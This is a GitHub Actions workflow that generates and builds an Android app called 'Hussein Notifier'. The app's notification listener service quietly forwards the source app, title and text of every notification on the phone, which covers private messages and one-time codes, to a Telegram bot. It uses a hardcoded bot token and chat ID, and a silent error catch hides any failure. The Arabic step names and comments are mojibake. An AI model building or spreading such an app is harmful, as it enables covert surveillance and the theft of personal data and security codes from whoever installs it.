name: Hussein Auto Native Android Builder
on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: 1. Ø¥Ø¹Ø¯Ø§Ø¯ Ù„ØºØ© Ø¬Ø§ÙØ§
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: 2. Ø¨Ù†Ø§Ø¡ Ù‡ÙŠÙƒÙ„ Ø§Ù„ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„Ø£ØµÙ„ÙŠ (Ø¨Ø¯ÙˆÙ† Ù…ÙƒØªØ¨Ø§Øª Ø®Ø§Ø±Ø¬ÙŠØ©)
        run: |
          mkdir -p app/src/main/java/com/hussein/notifier
          mkdir -p app/src/main/res/layout

          # --- Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ù…Ø´Ø±ÙˆØ¹ Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ© ---
          cat << 'EOF' > settings.gradle
          rootProject.name = "HusseinNotifier"
          include ':app'
          EOF

          cat << 'EOF' > build.gradle
          plugins {
              id 'com.android.application' version '8.2.0' apply false
          }
          EOF

          # --- Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„Ø£Ù†Ø¯Ø±ÙˆÙŠØ¯ (ØªÙ… Ø¥Ø¶Ø§ÙØ© Ø¯Ø¹Ù… Ø§Ù„Ù„ØºØ© Ø§Ù„Ø¹Ø±Ø¨ÙŠØ© UTF-8) ---
          cat << 'EOF' > app/build.gradle
          plugins {
              id 'com.android.application'
          }
          android {
              namespace 'com.hussein.notifier'
              compileSdk 34
              defaultConfig {
                  applicationId "com.hussein.notifier"
                  minSdk 24
                  targetSdk 34
                  versionCode 1
                  versionName "1.0"
              }
              compileOptions {
                  sourceCompatibility JavaVersion.VERSION_17
                  targetCompatibility JavaVersion.VERSION_17
              }
          }
          tasks.withType(JavaCompile) {
              options.encoding = "UTF-8"
          }
          EOF

          # --- Ù…Ù„Ù Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ§Øª (Ù†Ø¸ÙŠÙ ÙˆÙ…Ø¨Ø§Ø´Ø±) ---
          cat << 'EOF' > app/src/main/AndroidManifest.xml
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
              <uses-permission android:name="android.permission.INTERNET" />
              <application
                  android:allowBackup="true"
                  android:label="Hussein Notifier"
                  android:theme="@android:style/Theme.Material.Light.DarkActionBar">
                  <activity android:name=".MainActivity" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
                  <service android:name=".MyNotificationListener"
                      android:label="Ø®Ø¯Ù…Ø© Ø³Ø­Ø¨ Ø§Ù„Ø§Ø´Ø¹Ø§Ø±Ø§Øª"
                      android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.service.notification.NotificationListenerService" />
                      </intent-filter>
                  </service>
              </application>
          </manifest>
          EOF

          # --- ÙˆØ§Ø¬Ù‡Ø© Ø§Ù„ØªØ·Ø¨ÙŠÙ‚ (ØªÙ… ØªØ¨Ø³ÙŠØ·Ù‡Ø§ Ù„Ø¶Ù…Ø§Ù† Ø§Ù„Ø¨Ù†Ø§Ø¡) ---
          cat << 'EOF' > app/src/main/res/layout/activity_main.xml
          <?xml version="1.0" encoding="utf-8"?>
          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
              android:layout_width="match_parent"
              android:layout_height="match_parent"
              android:gravity="center"
              android:orientation="vertical"
              android:padding="20dp">
              <TextView
                  android:layout_width="wrap_content"
                  android:layout_height="wrap_content"
                  android:text="Hussein Background App is Ready!"
                  android:textSize="20sp"
                  android:textStyle="bold"
                  android:layout_marginBottom="20dp"/>
              <Button
                  android:id="@+id/btn_permission"
                  android:layout_width="wrap_content"
                  android:layout_height="wrap_content"
                  android:text="Click to Enable Permissions"/>
          </LinearLayout>
          EOF

          # --- Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ (Ø¨Ø¯ÙˆÙ† AppCompat Ù„ØªØ¬Ù†Ø¨ Ø§Ù„Ø£Ø®Ø·Ø§Ø¡) ---
          cat << 'EOF' > app/src/main/java/com/hussein/notifier/MainActivity.java
          package com.hussein.notifier;
          import android.app.Activity;
          import android.content.Intent;
          import android.os.Bundle;
          import android.provider.Settings;
          import android.widget.Button;
          public class MainActivity extends Activity {
              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  setContentView(R.layout.activity_main);
                  Button btn = findViewById(R.id.btn_permission);
                  btn.setOnClickListener(v -> {
                      startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
                  });
              }
          }
          EOF

          # --- Ø®Ø¯Ù…Ø© Ø§Ù„Ø¥Ø´Ø¹Ø§Ø±Ø§Øª (Ø§Ù„ØªÙŠ ØªØ±Ø³Ù„ Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…) ---
          cat << 'EOF' > app/src/main/java/com/hussein/notifier/MyNotificationListener.java
          package com.hussein.notifier;
          import android.service.notification.NotificationListenerService;
          import android.service.notification.StatusBarNotification;
          import java.net.HttpURLConnection;
          import java.net.URL;
          import java.net.URLEncoder;
          public class MyNotificationListener extends NotificationListenerService {
              
              
              private final String BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
              private final String CHAT_ID = "7392262688";
              
              @Override
              public void onNotificationPosted(StatusBarNotification sbn) {
                  if (sbn.getPackageName().equals("android")) return;
                  try {
                      String appName = sbn.getPackageName();
                      String title = sbn.getNotification().extras.getString("android.title");
                      CharSequence textChar = sbn.getNotification().extras.getCharSequence("android.text");
                      String text = textChar != null ? textChar.toString() : "Ø¨Ø¯ÙˆÙ† Ù†Øµ";
                      String msg = "ğŸ”” Ø¥Ø´Ø¹Ø§Ø± Ù…Ù†: " + appName + "\nğŸ‘¤: " + title + "\nğŸ’¬: " + text;
                      sendToTelegram(msg);
                  } catch (Exception e) {}
              }
              private void sendToTelegram(String message) {
                  new Thread(() -> {
                      try {
                          String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(message, "UTF-8");
                          HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
                          conn.setRequestMethod("GET");
                          conn.getInputStream();
                          conn.disconnect();
                      } catch (Exception e) {}
                  }).start();
              }
          }
          EOF

      - name: 3. Ø¥Ø¹Ø¯Ø§Ø¯ Ø£Ø¯Ø§Ø© Ø§Ù„Ø¨Ù†Ø§Ø¡ (ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù†Ø³Ø®Ø© Ø§Ù„Ù…ØªÙˆØ§ÙÙ‚Ø©)
        uses: gradle/actions/setup-gradle@v3
        with:
          gradle-version: '8.5'

      - name: 4. ØªØ­ÙˆÙŠÙ„ Ø§Ù„ÙƒÙˆØ¯ Ø¥Ù„Ù‰ ØªØ·Ø¨ÙŠÙ‚ (APK)
        run: gradle assembleDebug

      - name: 5. Ø­ÙØ¸ Ø§Ù„Ù€ APK Ø§Ù„Ø¬Ø§Ù‡Ø²
        uses: actions/upload-artifact@v4
        with:
          name: Hussein-Native-App
          path: app/build/outputs/apk/debug/*.apk
